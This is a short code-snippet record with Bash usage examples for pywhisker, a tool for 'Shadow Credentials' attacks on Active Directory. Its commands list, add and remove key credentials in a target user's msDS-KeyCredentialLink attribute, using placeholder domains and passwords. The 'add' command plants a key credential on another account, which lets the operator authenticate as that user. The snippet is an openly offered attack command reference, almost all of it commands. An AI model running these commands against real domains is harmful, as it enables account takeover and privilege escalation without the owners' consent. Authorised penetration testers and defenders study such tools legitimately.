---
id: e0f26c1d-202a-4175-8a6c-37fab31ca8e7
type: code
language: Bash
verified: false
created_at: '2023-04-06T03:56:06.261577+00:00'
updated_at: '2023-04-10T20:26:09.587264+00:00'
---

# Code Snippet e0f26c1d

**Language**: Bash

```bash
# Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
Lists all the key credentials associated with the specified user.

# Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "add"
Adds a new key credential to the specified user.

# Removes a key credential from the target object specified by a DeviceID GUID.
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
Removes the specified key credential from the specified user.
```
